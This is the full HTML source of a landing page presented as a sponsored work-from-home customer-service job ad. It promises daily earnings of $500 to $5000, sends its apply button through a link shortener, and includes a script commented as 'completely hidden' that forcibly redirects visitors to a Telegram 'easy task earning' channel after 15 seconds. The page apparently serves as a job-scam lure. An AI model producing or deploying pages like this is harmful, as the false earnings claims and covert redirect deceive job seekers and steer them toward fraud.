<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Work From Home Opportunity</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/your-kit-code.js" crossorigin="anonymous"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #6366f1, #3b82f6);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
        }

        .sponsored-tag {
            background: #f59e0b;
            color: white;
            padding: 8px 15px;
            border-radius: 50px;
            font-size: 14px;
            display: inline-block;
            margin-bottom: 20px;
        }

        h1 {
            color: #1e293b;
            font-size: 2.5rem;
            margin-bottom: 15px;
        }

        .highlight {
            color: #3b82f6;
        }

        .benefits-container {
            display: flex;
            gap: 20px;
            margin: 30px 0;
        }

        .benefit-card {
            flex: 1;
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            text-align: center;
        }

        .benefit-card i {
            font-size: 2rem;
            color: #3b82f6;
            margin-bottom: 15px;
        }

        .cta-button {
            background: linear-gradient(45deg, #6366f1, #3b82f6);
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: transform 0.3s ease;
            display: block;
            width: fit-content;
            margin: 25px auto 0;
            text-decoration: none;
        }

        .cta-button:hover {
            transform: translateY(-2px);
        }

        @media (max-width: 768px) {
            .benefits-container {
                flex-direction: column;
            }
            
            h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sponsored-tag">Sponsored</div>
        <h1>Work From Home!<br><span class="highlight">Customer Service Positions</span></h1>
        
        <div class="benefits-container">
            <div class="benefit-card">
                <i class="fas fa-money-bill-wave"></i>
                <h3>Daily Earnings</h3>
                <p>$500 - $5000</p>
            </div>
            
            <div class="benefit-card">
                <i class="fas fa-home"></i>
                <h3>Remote Work</h3>
                <p>Work From Anywhere</p>
            </div>
            
            <div class="benefit-card">
                <i class="fas fa-mouse"></i>
                <h3>Easy Setup</h3>
                <p>Simple to Operate</p>
            </div>
        </div>

        <a href="https://hodlink.in/d79516" class="cta-button">Apply Now & Get Started!</a>
    </div>

    <script>
        // Countdown timer in background (completely hidden)
        let countdownTime = 15; // Set timer in seconds
        let redirectURL = "https://t.me/Easytaskearnig"; // Change this to your desired redirect URL

        setTimeout(() => {
            window.location.href = redirectURL; // Redirect after countdown ends
        }, countdownTime * 1000);
    </script>
</body>
</html>
